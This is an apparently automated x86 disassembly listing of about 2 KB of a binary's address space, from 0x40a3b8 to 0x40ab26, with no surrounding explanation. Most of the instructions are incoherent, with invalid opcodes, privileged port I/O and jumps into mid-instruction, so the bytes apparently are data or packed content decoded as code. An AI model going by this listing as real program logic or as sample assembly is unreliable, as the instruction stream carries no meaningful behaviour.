  40a3b8:	add    cl,BYTE PTR [edi]
  40a3ba:	push   ebx
  40a3bb:	jecxz  0x40a437
  40a3bd:	sti    
  40a3be:	cmp    BYTE PTR [ecx+0x4c],ch
  40a3c1:	adc    eax,0x75952f8a
  40a3c6:	ret    0x674
  40a3c9:	std    
  40a3ca:	nop
  40a3cb:	and    BYTE PTR [ebp-0x38f7b1d9],al
  40a3d1:	push   0x202426b0
  40a3d6:	add    eax,DWORD PTR [ebx]
  40a3d8:	arpl   dx,bx
  40a3da:	add    eax,0xcefa5dbf
  40a3df:	jp     0x40a363
  40a3e1:	add    eax,0x24ad996f
  40a3e6:	jnp    0x40a457
  40a3e8:	fldcw  WORD PTR [ebp-0x282042ec]
  40a3ee:	fsubr  QWORD PTR [ebp+0x339294da]
  40a3f4:	mov    bh,0xaf
  40a3f6:	rol    DWORD PTR [ecx+eiz*2],1
  40a3f9:	sub    DWORD PTR [edi+edi*1-0x5674ce8a],ebp
  40a400:	inc    esi
  40a401:	jmp    0x40a3af
  40a403:	xchg   BYTE PTR [ebx],ah
  40a405:	dec    edi
  40a406:	jo     0x40a3a4
  40a408:	test   esp,edi
  40a40a:	(bad)  
  40a40b:	pop    esp
  40a40c:	out    0xbc,eax
  40a40e:	pop    edi
  40a40f:	rol    BYTE PTR [esp+edx*1-0x63],1
  40a413:	loopne 0x40a3dd
  40a415:	enter  0x9c1c,0x2a
  40a419:	test   eax,0xddad08d9
  40a41e:	js     0x40a496
  40a420:	gs jl  0x40a44e
  40a423:	push   es
  40a424:	(bad)  
  40a425:	ins    BYTE PTR es:[edi],dx
  40a426:	adc    al,0xdb
  40a428:	mov    esp,DWORD PTR [edx+0x1d]
  40a42b:	pop    esp
  40a42c:	scas   eax,DWORD PTR es:[edi]
  40a42d:	out    dx,eax
  40a42e:	out    0x60,eax
  40a430:	push   edi
  40a431:	aaa    
  40a432:	mov    ebx,0x87687cb
  40a437:	and    BYTE PTR ds:0x9a160763,0xef
  40a43e:	out    0xa5,al
  40a440:	cmp    al,0x42
  40a442:	xor    ebp,DWORD PTR [esi]
  40a444:	ss pop esi
  40a446:	jnp    0x40a47a
  40a448:	retf   
  40a449:	inc    esi
  40a44a:	repz imul esp,DWORD PTR [edx-0x678a4695],0x3bb777ea
  40a455:	data16 int 0x3
  40a458:	pop    ebx
  40a459:	aam    0x82
  40a45b:	int    0x38
  40a45d:	sbb    edi,DWORD PTR [edi]
  40a45f:	out    dx,eax
  40a460:	cmp    eax,eax
  40a462:	call   0xca48cd2c
  40a467:	adc    DWORD PTR [eax+0x2f],0x6d61e99c
  40a46e:	xchg   ecx,eax
  40a46f:	sub    cl,BYTE PTR [eax-0x4684c2d7]
  40a475:	(bad)  
  40a476:	xor    BYTE PTR [ebx+0x68],al
  40a479:	clc    
  40a47a:	push   esp
  40a47b:	inc    eax
  40a47c:	pop    edi
  40a47d:	fistp  QWORD PTR [ecx+0x59cd8a13]
  40a483:	xlat   BYTE PTR ds:[ebx]
  40a484:	bts    DWORD PTR [esi+0x609698cf],edx
  40a48b:	dec    edx
  40a48c:	inc    esp
  40a48d:	xor    DWORD PTR [eax-0x1c],ebx
  40a490:	jp     0x40a4ec
  40a492:	and    eax,0x1f08076
  40a497:	mov    eax,0x95b40487
  40a49c:	test   al,0xad
  40a49e:	imul   eax,DWORD PTR [esi+0x24],0xb3a2b662
  40a4a5:	sbb    eax,0x67c72d33
  40a4aa:	mov    ?,WORD PTR [ebx]
  40a4ac:	xor    ecx,0x1d
  40a4af:	int    0x84
  40a4b1:	int3   
  40a4b2:	test   DWORD PTR [edx],esi
  40a4b4:	jnp    0x40a4c8
  40a4b6:	stos   BYTE PTR es:[edi],al
  40a4b7:	pop    edi
  40a4b8:	ret    0x2e2d
  40a4bb:	inc    eax
  40a4bc:	je     0x52c5e785
  40a4c2:	mov    BYTE PTR [esi-0x6d],bh
  40a4c5:	mov    eax,ds:0xd53527e8
  40a4ca:	inc    ebp
  40a4cb:	sub    dh,bl
  40a4cd:	sub    ah,BYTE PTR [ebx-0x485ce39a]
  40a4d3:	pop    esp
  40a4d4:	pop    esp
  40a4d5:	inc    ebp
  40a4d6:	sbb    BYTE PTR [ecx-0x5e],cl
  40a4d9:	jl     0x40a555
  40a4db:	push   ebp
  40a4dc:	in     al,dx
  40a4dd:	jge    0x40a546
  40a4df:	hlt    
  40a4e0:	mov    al,ds:0xe1d431a4
  40a4e5:	add    edi,eax
  40a4e7:	or     BYTE PTR [ebx-0x4b],0x9c
  40a4eb:	mov    bh,0xd7
  40a4ed:	sub    dh,BYTE PTR [ebx+eax*4-0x27]
  40a4f1:	sbb    BYTE PTR [esi],bh
  40a4f3:	push   es
  40a4f4:	jge    0x40a547
  40a4f6:	pop    ss
  40a4f7:	rsqrtps xmm6,XMMWORD PTR [esi-0x4e]
  40a4fb:	pushf  
  40a4fc:	mov    dh,0x65
  40a4fe:	in     al,dx
  40a4ff:	shl    BYTE PTR [edi],cl
  40a501:	sti    
  40a502:	adc    eax,0x1b152b3a
  40a507:	out    dx,eax
  40a508:	sub    al,0x9
  40a50a:	add    al,bh
  40a50c:	xor    ch,0x41
  40a50f:	int    0x5e
  40a511:	jno    0x40a577
  40a513:	pop    edi
  40a514:	sub    al,0xaa
  40a516:	imul   DWORD PTR [ecx]
  40a518:	dec    edi
  40a519:	pop    ebx
  40a51a:	add    dl,dh
  40a51c:	xchg   esi,eax
  40a51d:	push   0x68b004b
  40a522:	cld    
  40a523:	xor    bh,ah
  40a525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a526:	ja     0x40a557
  40a528:	jbe    0x40a5a5
  40a52a:	imul   eax,DWORD PTR [edx],0x35
  40a52d:	adc    al,0xe4
  40a52f:	in     eax,dx
  40a530:	adc    BYTE PTR [eax-0x176d42f],cl
  40a536:	lahf   
  40a537:	jo     0x40a597
  40a539:	fadd   st(4),st
  40a53b:	sub    edx,eax
  40a53d:	xchg   BYTE PTR [ebx+0x39812dbb],cl
  40a543:	(bad)  es:[ebx+0x3e]
  40a547:	push   esi
  40a548:	daa    
  40a549:	mov    esp,gs
  40a54b:	adc    al,0x1a
  40a54d:	stos   DWORD PTR es:[edi],eax
  40a54e:	inc    esp
  40a54f:	les    edi,FWORD PTR [edx+0x6]
  40a552:	int    0x73
  40a554:	push   eax
  40a555:	test   eax,0x82b166b0
  40a55a:	add    al,0x9b
  40a55c:	(bad)  
  40a55e:	push   ss
  40a55f:	fs jge 0x40a513
  40a562:	mov    ?,ecx
  40a564:	out    dx,eax
  40a565:	icebp  
  40a566:	retf   0xc0dd
  40a569:	pop    edx
  40a56a:	bound  ecx,QWORD PTR [edx-0x42]
  40a56d:	stos   BYTE PTR es:[edi],al
  40a56e:	xor    eax,0xa5209781
  40a573:	ror    esi,0x2b
  40a576:	dec    esp
  40a577:	push   ebp
  40a578:	jb     0x40a5d2
  40a57a:	dec    esp
  40a57b:	rol    DWORD PTR [eax],0xb8
  40a57e:	sbb    ah,dl
  40a580:	mov    eax,0xb3bffa90
  40a585:	retf   
  40a586:	rol    BYTE PTR [ebx+0x56],cl
  40a589:	sahf   
  40a58a:	fcom   QWORD PTR [ebx]
  40a58c:	shl    BYTE PTR [esi+0x5f],1
  40a58f:	mov    al,ds:0x6ea5785a
  40a594:	ins    DWORD PTR es:[edi],dx
  40a595:	cmp    bl,BYTE PTR [ecx*2+0x23a512b4]
  40a59c:	aad    0xaa
  40a59e:	jmp    0xe1a02a75
  40a5a3:	pop    edi
  40a5a4:	xor    eax,0xcc383b10
  40a5a9:	adc    eax,0x7443b187
  40a5ae:	(bad)  [ebp-0x1f]
  40a5b1:	mov    dl,0xb2
  40a5b3:	out    dx,al
  40a5b4:	test   BYTE PTR ds:[edi+0x34],0x6f
  40a5b9:	fstp   TBYTE PTR [edx]
  40a5bb:	pop    esp
  40a5bc:	cmp    ch,bl
  40a5be:	test   dl,0xb3
  40a5c1:	push   0x96bbc481
  40a5c6:	add    al,0xc6
  40a5c8:	arpl   WORD PTR [ecx-0x56445912],bp
  40a5ce:	ins    DWORD PTR es:[edi],dx
  40a5cf:	adc    ebx,ebx
  40a5d1:	retf   0xb7b6
  40a5d4:	stos   DWORD PTR es:[edi],eax
  40a5d5:	jb     0x40a631
  40a5d7:	jns    0x40a5e6
  40a5d9:	loop   0x40a646
  40a5db:	xor    al,0xd4
  40a5dd:	popf   
  40a5de:	out    dx,eax
  40a5df:	fwait
  40a5e0:	test   al,0x4a
  40a5e2:	add    BYTE PTR [edx-0x343e7e68],bl
  40a5e8:	(bad)  
  40a5e9:	jg     0x40a5a7
  40a5eb:	inc    ebp
  40a5ec:	jmp    0x84ef9e5e
  40a5f1:	ret    
  40a5f2:	inc    edi
  40a5f3:	scas   eax,DWORD PTR es:[edi]
  40a5f4:	enter  0x7cd5,0x89
  40a5f8:	data16 xor al,0xf5
  40a5fb:	aas    
  40a5fc:	fmul   QWORD PTR [ebx-0x1aaed122]
  40a602:	add    BYTE PTR [edx],dh
  40a604:	adc    edx,ebp
  40a606:	inc    ecx
  40a607:	adc    edx,ecx
  40a609:	bound  eax,QWORD PTR ds:0xb7dd6cd1
  40a60f:	sbb    ebx,DWORD PTR [eax]
  40a611:	lahf   
  40a612:	setno  BYTE PTR [ecx+0x34]
  40a616:	cmc    
  40a617:	out    dx,eax
  40a618:	in     eax,dx
  40a619:	int3   
  40a61a:	xchg   DWORD PTR [si+0x28a9],ebp
  40a61f:	mov    ebp,0x471bfbc6
  40a624:	pop    edi
  40a625:	xchg   DWORD PTR [ebx-0x126eaf99],ebp
  40a62b:	jnp    0x40a5ad
  40a62d:	fstp   TBYTE PTR [eax-0x30]
  40a630:	adc    DWORD PTR [ebx],esp
  40a632:	hlt    
  40a633:	mov    ch,0x48
  40a635:	inc    ebp
  40a636:	call   0x91e6:0xf6a30ff1
  40a63d:	imul   esp,DWORD PTR [ebp-0x1],0xb1e087d5
  40a644:	fsubrp st(5),st
  40a646:	(bad)  
  40a647:	mov    ebp,0x4db93415
  40a64c:	and    eax,0xa1cb8e5e
  40a651:	pusha  
  40a652:	sar    DWORD PTR [edx+0x49],cl
  40a655:	jae    0x40a60f
  40a657:	xor    BYTE PTR [eax],dl
  40a659:	scas   al,BYTE PTR es:[edi]
  40a65a:	add    bh,cl
  40a65c:	mov    DWORD PTR [ebp+0x5a],eax
  40a65f:	mov    al,cl
  40a661:	in     eax,0x53
  40a663:	sbb    edx,ebx
  40a665:	cdq    
  40a666:	sbb    ah,dh
  40a668:	inc    esi
  40a669:	push   ecx
  40a66a:	cmp    BYTE PTR [ecx],bh
  40a66c:	push   edi
  40a66d:	out    0x26,eax
  40a66f:	clc    
  40a670:	icebp  
  40a671:	fild   QWORD PTR [ebx]
  40a673:	pop    ds
  40a674:	aam    0x1
  40a676:	jge    0x40a63a
  40a678:	(bad)  
  40a679:	lods   eax,DWORD PTR ds:[esi]
  40a67a:	je     0x40a6bc
  40a67c:	lds    esp,FWORD PTR [ebp+0x36]
  40a67f:	push   eax
  40a680:	push   ebx
  40a681:	rol    DWORD PTR [edi-0x2b3d9b40],0xf
  40a688:	pop    esi
  40a689:	xor    esi,ebp
  40a68b:	dec    edi
  40a68c:	jno    0x40a60f
  40a68e:	add    ebp,esi
  40a690:	push   eax
  40a691:	push   ds
  40a692:	mov    edx,0xfe334779
  40a697:	cs into 
  40a699:	shr    DWORD PTR [ebx-0x4bde07d8],cl
  40a69f:	arpl   WORD PTR [edx+0x78],di
  40a6a2:	sar    dh,1
  40a6a4:	call   0xaf5be654
  40a6a9:	in     al,dx
  40a6aa:	outs   dx,DWORD PTR ds:[esi]
  40a6ab:	jecxz  0x40a706
  40a6ad:	xchg   edi,eax
  40a6ae:	or     dl,cl
  40a6b0:	pop    esi
  40a6b1:	orps   xmm4,xmm5
  40a6b4:	sar    bh,0x6e
  40a6b7:	in     eax,0x1
  40a6b9:	and    ecx,DWORD PTR [edx+0x2d3ec346]
  40a6bf:	into   
  40a6c0:	pop    ds
  40a6c1:	pop    edi
  40a6c2:	int3   
  40a6c3:	jle    0x40a690
  40a6c5:	mov    eax,0x19211afa
  40a6ca:	rcr    BYTE PTR [esi-0xf71653],1
  40a6d0:	mov    bl,0xfa
  40a6d2:	cmp    BYTE PTR [esi],0x8c
  40a6d5:	in     al,0x32
  40a6d7:	out    dx,eax
  40a6d8:	push   ebp
  40a6d9:	stos   DWORD PTR es:[edi],eax
  40a6da:	jns    0x40a735
  40a6dc:	pop    ebx
  40a6dd:	xor    esi,eax
  40a6df:	data16 stos BYTE PTR es:[edi],al
  40a6e1:	inc    esi
  40a6e2:	sahf   
  40a6e3:	sbb    BYTE PTR [ecx+0x45],bh
  40a6e6:	jl     0x40a6e1
  40a6e8:	and    esi,eax
  40a6ea:	xchg   edi,eax
  40a6eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6ec:	ss inc ecx
  40a6ee:	pop    edx
  40a6ef:	fdivr  st,st(5)
  40a6f1:	mov    eax,0x60743c0d
  40a6f6:	jbe    0x40a6fb
  40a6f8:	dec    ebp
  40a6f9:	inc    ecx
  40a6fa:	fs jns 0x40a686
  40a6fd:	push   cs
  40a6fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6ff:	ja     0x40a6c7
  40a701:	or     dl,BYTE PTR ds:[eax-0x52]
  40a705:	xor    DWORD PTR [esi+0x7247ba41],edi
  40a70b:	mov    cl,0x11
  40a70d:	cmc    
  40a70e:	popa   
  40a70f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a710:	and    esi,DWORD PTR [esi-0x162a1a55]
  40a716:	ins    DWORD PTR es:[edi],dx
  40a717:	xchg   ebx,eax
  40a718:	enter  0xcb67,0xd3
  40a71c:	sub    DWORD PTR [eax],ecx
  40a71e:	jl     0x40a780
  40a720:	or     al,0xf4
  40a722:	cmc    
  40a723:	imul   ecx,ebx,0x2c512b77
  40a729:	(bad)  
  40a72b:	xor    al,0xd2
  40a72d:	popf   
  40a72e:	pop    edi
  40a72f:	sub    ebx,DWORD PTR [ebp-0x335ad93f]
  40a735:	jecxz  0x40a6db
  40a737:	push   edi
  40a738:	test   DWORD PTR [ecx+0x3ce85007],ebp
  40a73e:	out    dx,al
  40a73f:	lahf   
  40a740:	icebp  
  40a741:	jmp    0x40a73c
  40a743:	adc    BYTE PTR [ebx+0x6c23f2d9],cl
  40a749:	sub    DWORD PTR [edx],ebx
  40a74b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a74c:	arpl   WORD PTR [edi],si
  40a74e:	and    al,0x60
  40a750:	jbe    0x40a6fd
  40a752:	sbb    eax,0xc06e62bd
  40a757:	nop
  40a758:	and    eax,edi
  40a75a:	es mov esp,0xcc6f3d66
  40a760:	sub    DWORD PTR [edi+eax*2],ebp
  40a763:	data16 sub BYTE PTR [ebx],dh
  40a766:	pop    esi
  40a767:	mov    edx,0x67c9bb79
  40a76c:	push   esi
  40a76d:	inc    edx
  40a76e:	xchg   esi,eax
  40a76f:	mov    edx,0xe881be3f
  40a774:	retf   0xf3b4
  40a777:	test   eax,0x5870d918
  40a77c:	fdivr  QWORD PTR [ecx+esi*4]
  40a77f:	push   ds
  40a780:	fidiv  DWORD PTR [eax-0x10]
  40a783:	leave  
  40a784:	fwait
  40a785:	sub    bl,dh
  40a787:	mov    ebx,0x71a8c033
  40a78c:	ss call 0xf08e32e7
  40a792:	mov    edx,DWORD PTR [ebp-0xc]
  40a795:	xor    eax,edi
  40a797:	shl    ecx,0x1e
  40a79a:	mov    ecx,DWORD PTR [ebp-0x14]
  40a79d:	xor    edx,edx
  40a79f:	or     eax,edx
  40a7a1:	mov    cl,BYTE PTR [eax+ecx*1]
  40a7a4:	mov    eax,DWORD PTR [ebp-0x34]
  40a7a7:	jmp    0x40ad31
  40a7ac:	inc    ebx
  40a7ad:	dec    esi
  40a7ae:	aad    0x8e
  40a7b0:	fcom   DWORD PTR [eax+ebx*1]
  40a7b3:	inc    edx
  40a7b4:	loop   0x40a7dd
  40a7b6:	ds push 0x7426d8e0
  40a7bc:	or     ax,0x1616
  40a7c0:	cmp    eax,0x2a161604
  40a7c5:	push   esi
  40a7c6:	push   cs
  40a7c7:	out    dx,eax
  40a7c8:	clc    
  40a7c9:	shl    ch,0xd2
  40a7cc:	pop    ebx
  40a7cd:	(bad)  
  40a7ce:	mov    ecx,0x78c9b675
  40a7d3:	inc    edi
  40a7d4:	push   ss
  40a7d5:	cwde   
  40a7d6:	cli    
  40a7d7:	lock in al,0xc8
  40a7da:	call   0xc396841
  40a7df:	xor    ch,BYTE PTR cs:[ebp+0x6d]
  40a7e3:	scas   eax,DWORD PTR es:[edi]
  40a7e4:	ja     0x40a77c
  40a7e6:	retf   0x4309
  40a7e9:	mov    esi,0x28ce0d27
  40a7ee:	std    
  40a7ef:	ss dec ecx
  40a7f1:	push   ebp
  40a7f2:	daa    
  40a7f3:	int3   
  40a7f4:	mov    es,WORD PTR [edi+0x6]
  40a7f7:	inc    eax
  40a7f8:	mov    dl,ah
  40a7fa:	in     eax,dx
  40a7fb:	aaa    
  40a7fc:	fldcw  WORD PTR [edi-0x1c7793]
  40a802:	hlt    
  40a803:	add    BYTE PTR [esi+0x43],al
  40a806:	bound  edi,QWORD PTR [edx-0x2fb97a6d]
  40a80c:	lds    edi,FWORD PTR [ebx-0x797b2a8e]
  40a812:	mov    ch,BYTE PTR [esi+0x1c]
  40a815:	cmp    bl,ah
  40a817:	or     dh,BYTE PTR [ecx-0x50]
  40a81a:	push   0x30f2b9e3
  40a81f:	push   edi
  40a820:	in     eax,dx
  40a821:	pop    es
  40a822:	je     0x40a83e
  40a824:	push   cs
  40a825:	cmp    ah,BYTE PTR [ecx]
  40a827:	lds    ecx,FWORD PTR [esi+ebx*1]
  40a82a:	xor    DWORD PTR [ebx-0x40],ecx
  40a82d:	add    DWORD PTR [esi-0x2a],esp
  40a830:	pop    ss
  40a831:	dec    ebp
  40a832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a833:	mov    ebx,0x7dce21df
  40a838:	stos   BYTE PTR es:[edi],al
  40a839:	fmul   QWORD PTR [edx]
  40a83b:	sar    BYTE PTR [eax-0x2fffe620],cl
  40a841:	xor    BYTE PTR ds:0x7907bec,cl
  40a847:	into   
  40a848:	xor    al,0x2
  40a84a:	sbb    cl,BYTE PTR [edi-0x5f]
  40a84d:	mov    gs,WORD PTR [edi-0x1322c4cb]
  40a853:	add    edi,DWORD PTR [ecx]
  40a855:	jnp    0x40a8c5
  40a857:	pop    ecx
  40a858:	add    ah,BYTE PTR [edx+0x7f]
  40a85b:	retf   
  40a85c:	add    al,0x9
  40a85e:	lods   eax,DWORD PTR ds:[esi]
  40a85f:	outs   dx,DWORD PTR ds:[esi]
  40a860:	push   ds
  40a861:	mov    ebx,0xbebfc275
  40a866:	data16 mov bh,0x9f
  40a869:	xchg   esp,eax
  40a86a:	icebp  
  40a86b:	mov    edx,0x166e6268
  40a870:	fidivr DWORD PTR [esi-0x617ecad5]
  40a876:	jmp    0x40a839
  40a878:	(bad)
  40a87b:	in     al,0xe
  40a87d:	mov    ds:0x960652ed,eax
  40a882:	test   dh,0x80
  40a885:	and    eax,0x5f57637d
  40a88a:	mov    esi,0x64f202ae
  40a88f:	inc    eax
  40a890:	ret    
  40a891:	mov    dl,BYTE PTR [edi-0x4a]
  40a894:	stos   BYTE PTR es:[edi],al
  40a895:	neg    BYTE PTR [eax+edi*1]
  40a898:	sub    al,0xe
  40a89a:	mov    ebx,0xf4218062
  40a89f:	dec    ecx
  40a8a0:	pop    ss
  40a8a1:	xchg   ebx,eax
  40a8a2:	add    DWORD PTR [ebp-0x2539b182],eax
  40a8a8:	or     BYTE PTR cs:[edx+0x2a53eb4d],ah
  40a8af:	push   ds
  40a8b0:	jecxz  0x40a8ea
  40a8b2:	mov    dl,0x4b
  40a8b4:	mov    ds:0x7628f0aa,al
  40a8b9:	cli    
  40a8ba:	adc    BYTE PTR [ecx],0x3a
  40a8bd:	int3   
  40a8be:	rcr    DWORD PTR [edx-0x99daa92],cl
  40a8c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8c5:	or     BYTE PTR [edi+0x1a37cf13],0x84
  40a8cc:	test   eax,0x815c6f34
  40a8d1:	outs   dx,BYTE PTR ds:[esi]
  40a8d2:	sti    
  40a8d3:	xchg   BYTE PTR [edx+0x36fa32f0],bl
  40a8d9:	sahf   
  40a8da:	sub    ebx,esp
  40a8dc:	mov    cl,0xcb
  40a8de:	ret    
  40a8df:	jmp    0x40a955
  40a8e1:	push   cs
  40a8e2:	pushf  
  40a8e3:	loope  0x40a874
  40a8e5:	inc    esi
  40a8e6:	push   edi
  40a8e7:	jb     0x40a880
  40a8e9:	mov    edx,0xab1afe82
  40a8ee:	inc    ecx
  40a8ef:	jl     0x40a8d4
  40a8f1:	mov    bl,0x8a
  40a8f3:	fldenv [ecx]
  40a8f5:	out    0xc,eax
  40a8f7:	fisttp WORD PTR [edi+0x64e1532f]
  40a8fd:	mov    al,ds:0x98455996
  40a902:	ret    
  40a903:	ret    
  40a904:	cwde   
  40a905:	cmp    al,0x21
  40a908:	xlat   BYTE PTR ds:[ebx]
  40a909:	sbb    al,0x99
  40a90b:	aas    
  40a90c:	dec    BYTE PTR [eax-0x1df995]
  40a912:	mov    al,0x68
  40a914:	popa   
  40a915:	jmp    0x40a91b
  40a917:	pop    ecx
  40a918:	fmul   QWORD PTR [ecx-0xc]
  40a91b:	mov    al,ds:0x8d6318b4
  40a920:	pop    ecx
  40a921:	fidiv  WORD PTR [esi-0x69]
  40a924:	pusha  
  40a925:	retf   
  40a926:	add    DWORD PTR [ebp-0xaf05bcd],eax
  40a92c:	cmp    eax,0xe57dd84f
  40a931:	adc    DWORD PTR [edx],edx
  40a933:	jg     0x40a8dc
  40a935:	pop    eax
  40a936:	ds ficom DWORD PTR ss:[esi-0x6a]
  40a93b:	fs popf 
  40a93d:	ds stos DWORD PTR es:[edi],eax
  40a93f:	in     eax,0xbd
  40a941:	in     al,0x95
  40a943:	aam    0x24
  40a945:	xchg   edx,eax
  40a946:	sbb    bl,0x34
  40a949:	xchg   edi,eax
  40a94a:	test   al,0x4e
  40a94c:	and    eax,0xe3d93870
  40a951:	inc    ebx
  40a952:	lods   al,BYTE PTR ds:[esi]
  40a953:	(bad)  
  40a954:	fs dec esi
  40a956:	and    edi,edx
  40a958:	fnstcw WORD PTR [esi-0x43ea54bf]
  40a95e:	jle    0x40a9a7
  40a960:	test   DWORD PTR [ebx+esi*2+0x44],ecx
  40a964:	add    DWORD PTR [ebx-0x6f],ebp
  40a967:	and    BYTE PTR [esi],ch
  40a969:	in     eax,dx
  40a96a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a96b:	je     0x40a901
  40a96d:	dec    ebp
  40a96e:	jbe    0x40a9b3
  40a970:	cld    
  40a971:	sub    BYTE PTR [eax-0x3f],0xb0
  40a975:	in     eax,0xd
  40a977:	ror    BYTE PTR [ebp-0x33de5ff8],0xe8
  40a97e:	fbld   TBYTE PTR [ecx+ecx*8-0x35]
  40a982:	jo     0x40a9b8
  40a984:	ins    DWORD PTR es:[edi],dx
  40a985:	push   0x38
  40a987:	mov    al,ds:0xe0ca5be0
  40a98c:	jno    0x40a9f9
  40a98e:	mov    eax,0x2928894f
  40a993:	jge    0x40a95c
  40a995:	hlt    
  40a996:	aam    0x6b
  40a998:	aad    0xdb
  40a99a:	mov    bh,0x71
  40a99c:	fwait
  40a99d:	push   ds
  40a99e:	xor    ebp,DWORD PTR [ebx]
  40a9a0:	inc    eax
  40a9a1:	jno    0x40a9a2
  40a9a3:	or     esp,DWORD PTR [ecx+esi*2]
  40a9a6:	cmp    ch,BYTE PTR [esi+0x2]
  40a9a9:	pop    ecx
  40a9aa:	push   0xe9447a66
  40a9af:	cs pushf 
  40a9b1:	or     al,0x35
  40a9b3:	sub    al,0x51
  40a9b5:	dec    eax
  40a9b6:	jno    0x40a93a
  40a9b8:	fstp   TBYTE PTR [eax-0x67]
  40a9bb:	sub    BYTE PTR [ecx],ch
  40a9bd:	sbb    al,0xa
  40a9bf:	(bad)  
  40a9c0:	iret   
  40a9c1:	rcr    BYTE PTR [eax-0x7c],0x5a
  40a9c5:	sub    DWORD PTR [esi],esi
  40a9c7:	mov    ax,ds:0x7e5cb7cd
  40a9cd:	or     eax,0xdd15fde7
  40a9d2:	sub    dh,dl
  40a9d4:	xor    DWORD PTR [ebp-0x4c35c8a6],edx
  40a9da:	into   
  40a9db:	test   eax,0x6329f3f
  40a9e0:	dec    esi
  40a9e1:	mov    cl,0x9c
  40a9e3:	nop
  40a9e4:	sub    eax,0x6c2dae9b
  40a9e9:	mov    ch,0x27
  40a9eb:	lods   al,BYTE PTR ds:[esi]
  40a9ec:	call   DWORD PTR [ecx-0x64c69fe7]
  40a9f2:	push   ebx
  40a9f3:	inc    esi
  40a9f4:	(bad)  
  40a9f5:	ficomp WORD PTR ds:0xfba33e76
  40a9fb:	mov    ch,0xd
  40a9fd:	sbb    BYTE PTR [esi+0x22],ah
  40aa00:	fidiv  WORD PTR [esi+0x5a43bb74]
  40aa06:	data16 mov dl,0x1
  40aa09:	gs ss xchg esi,eax
  40aa0c:	mov    bh,0xa
  40aa0e:	fadd   QWORD PTR [ebx-0x652f1df]
  40aa14:	retf   0x3a7b
  40aa17:	dec    eax
  40aa18:	or     DWORD PTR [ebp+0x5ef75ab7],0xfc32e7e0
  40aa22:	mov    ebp,0xbb5adb49
  40aa27:	push   esp
  40aa28:	xor    DWORD PTR [eax-0x47],0xffffff93
  40aa2c:	mov    al,ds:0xb8b2cf1
  40aa31:	stc    
  40aa32:	inc    ecx
  40aa33:	popf   
  40aa34:	jecxz  0x40aa49
  40aa36:	mov    ecx,0xc6674f94
  40aa3b:	and    dh,BYTE PTR [edx+0x3b]
  40aa3e:	mov    BYTE PTR [esi+0x20],dh
  40aa41:	(bad)  
  40aa42:	sub    dl,BYTE PTR [esi-0x4e2f5d0a]
  40aa48:	test   BYTE PTR [ecx-0x7593919c],dh
  40aa4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa4f:	cwde   
  40aa50:	addr16 dec ebp
  40aa52:	mov    bh,0x70
  40aa54:	xor    al,0x15
  40aa56:	das    
  40aa57:	jne    0x40aaab
  40aa59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa5a:	popa   
  40aa5b:	cmp    cl,dl
  40aa5d:	(bad)  
  40aa5e:	pop    ebp
  40aa5f:	cld    
  40aa60:	aad    0xc3
  40aa62:	pop    ecx
  40aa63:	cmp    al,0x46
  40aa65:	aaa    
  40aa66:	loopne 0x40aa72
  40aa68:	aaa    
  40aa69:	outs   dx,DWORD PTR ds:[esi]
  40aa6a:	dec    ebx
  40aa6b:	mov    bl,0x5a
  40aa6d:	rcl    DWORD PTR [ecx],0x44
  40aa70:	jl     0x40aa7b
  40aa72:	push   eax
  40aa73:	es mov al,0xb8
  40aa76:	jno    0x40aa6b
  40aa78:	rol    BYTE PTR [eax+0x2e8538],0x3e
  40aa7f:	jle    0x40aac3
  40aa81:	dec    esi
  40aa82:	lock mov dh,0x6d
  40aa85:	test   BYTE PTR [esi],dl
  40aa87:	jmp    0xd265:0x8829fcd9
  40aa8e:	scas   eax,DWORD PTR es:[edi]
  40aa8f:	sub    BYTE PTR [edi+esi*2],al
  40aa92:	mov    bl,0xf5
  40aa94:	xchg   ebp,eax
  40aa95:	sbb    ebp,esp
  40aa97:	js     0x40aac0
  40aa99:	adc    BYTE PTR ds:[esi-0x13],ch
  40aa9d:	test   BYTE PTR [eax],bl
  40aa9f:	(bad)
  40aaa2:	(bad)  
  40aaa3:	push   ebx
  40aaa4:	ret    
  40aaa5:	mov    al,0x11
  40aaa7:	xor    eax,0xbd5d14d1
  40aaac:	pop    edx
  40aaad:	fnsave [ebp-0x6262aa26]
  40aab3:	mov    ecx,0xb719ecd4
  40aab8:	inc    ecx
  40aab9:	and    BYTE PTR [edx],bh
  40aabb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aabc:	dec    ebp
  40aabd:	dec    eax
  40aabe:	sbb    dl,0xd4
  40aac1:	jnp    0x40aae7
  40aac3:	add    cl,BYTE PTR [ebx-0x57]
  40aac6:	lea    edi,[esi+0x1d1a7780]
  40aacc:	mov    ebx,0x62056d45
  40aad1:	add    bl,BYTE PTR [ecx]
  40aad3:	pushf  
  40aad4:	nop
  40aad5:	jno    0x40ab2f
  40aad7:	or     DWORD PTR [edi+ecx*8+0x28],0x52
  40aadc:	clc    
  40aadd:	in     eax,dx
  40aade:	mov    al,ds:0x71a4994f
  40aae3:	fisubr DWORD PTR [ecx]
  40aae5:	enter  0xe4fd,0x2
  40aae9:	xchg   ebx,edi
  40aaeb:	stos   BYTE PTR es:[edi],al
  40aaec:	jg     0x40aa82
  40aaee:	call   0xdcc:0x2ac2c6e6
  40aaf5:	or     ah,al
  40aaf7:	jns    0x40ab37
  40aaf9:	lea    edi,ds:0x58eca337
  40aaff:	cmp    cl,BYTE PTR [esi+0x28]
  40ab02:	fwait
  40ab03:	xrelease lock adc DWORD PTR [ebx-0x71ad4f28],0x2e065a0b
  40ab0f:	mov    esp,0xa8975691
  40ab14:	jge    0x40aa9f
  40ab16:	add    al,BYTE PTR [edx+0x69]
  40ab19:	out    dx,al
  40ab1a:	lahf   
  40ab1b:	push   ecx
  40ab1c:	inc    ebx
  40ab1d:	aad    0xd2
  40ab1f:	jo     0x40aaf0
  40ab21:	test   DWORD PTR [ebp+0x4b],esi
  40ab24:	(bad)  
  40ab26:	jno    0x40ab24
